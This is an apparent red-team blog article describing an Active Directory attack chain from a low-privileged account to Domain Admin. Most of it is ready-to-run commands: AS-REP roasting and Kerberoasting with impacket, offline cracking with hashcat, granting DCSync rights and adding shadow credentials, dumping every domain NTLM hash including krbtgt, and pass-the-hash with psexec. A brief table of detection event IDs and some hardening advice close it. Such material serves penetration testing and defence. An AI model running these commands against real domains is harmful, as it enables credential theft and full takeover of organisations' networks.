---
title: "Active Directory Attack Paths: Foothold to Domain Admin"
date: "2025-10-14"
type: article
tags: [active-directory, kerberos, privilege-escalation, windows, dcsync]
summary: "A walkthrough of the most reliable AD attack chain — from low-privileged shell to Domain Admin using AS-REP roasting, Kerberoasting, and DCSync."
published: true
---

## Introduction

Active Directory remains the backbone of most enterprise environments, and understanding its attack paths is essential for any red teamer. This article walks through a reliable chain from initial foothold to Domain Admin.

We'll cover:
- AS-REP Roasting to crack offline credentials
- Kerberoasting for service account passwords
- ACL abuse for privilege escalation
- DCSync for credential extraction

## Prerequisites

You need a low-privileged domain user account and network access to the target. Tools used:

- `impacket` suite
- `Rubeus`
- `BloodHound` + `SharpHound`
- `hashcat`

## Step 1: AS-REP Roasting

AS-REP roasting targets accounts where Kerberos pre-authentication is disabled. These accounts will respond to AS-REQ messages without requiring proof of identity first.

```bash
# Enumerate accounts without pre-auth (no credentials required)
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -outputfile asrep.hashes

# With credentials
impacket-GetNPUsers domain.local/user:Password123 -request -format hashcat
```

Crack the hashes offline:

```bash
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt --force
```

> **Note:** Even a single cracked account can unlock the entire attack chain if the user has interesting ACL permissions.

## Step 2: BloodHound Enumeration

Once you have valid credentials, collect BloodHound data to map attack paths:

```bash
# Remote collection (no agent on target)
bloodhound-python -u user -p 'Password123' -d domain.local -dc dc01.domain.local -c All --zip
```

Upload the ZIP to BloodHound and run:
- "Find Shortest Paths to Domain Admins"
- "Find Principals with DCSync Rights"
- "Find AS-REP Roastable Users"

## Step 3: Kerberoasting

Kerberoasting requests Ticket Granting Service (TGS) tickets for service accounts (SPNs) and attempts to crack them offline.

```bash
# List SPN accounts
impacket-GetUserSPNs domain.local/user:Password123 -dc-ip 10.10.10.10

# Request and save TGS tickets
impacket-GetUserSPNs domain.local/user:Password123 -dc-ip 10.10.10.10 -request -outputfile kerberoast.hashes
```

```bash
# Crack with hashcat
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

## Step 4: ACL Abuse

BloodHound may reveal that a compromised account has `GenericWrite`, `WriteDACL`, or `ForceChangePassword` on a privileged account.

### GenericWrite → Shadow Credentials

```bash
# Add a shadow credential to target account
certipy shadow auto -u user@domain.local -p 'Password123' -account target_account
```

### WriteDACL → DCSync

```powershell
# Grant DCSync rights to your account
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" -PrincipalIdentity user -Rights DCSync
```

## Step 5: DCSync

With DCSync rights, you can extract NTLM hashes for all domain accounts including krbtgt:

```bash
impacket-secretsdump domain.local/user:'Password123'@dc01.domain.local -just-dc-ntlm
```

```bash
# Pass the hash as Domain Admin
impacket-psexec -hashes :NTLM_HASH administrator@10.10.10.10
```

## Defense Recommendations

| Attack | Detection Signal |
|--------|-----------------|
| AS-REP Roasting | Event 4768 with RC4 encryption |
| Kerberoasting | Event 4769 with RC4 encryption |
| DCSync | Event 4662 with replication rights |
| Pass-the-Hash | Event 4624 with logon type 3 |

## Conclusion

The path from foothold to Domain Admin in Active Directory environments often follows predictable patterns. Regular BloodHound assessments, enforced Kerberos pre-authentication, and tier-0 asset isolation significantly raise the bar for attackers.
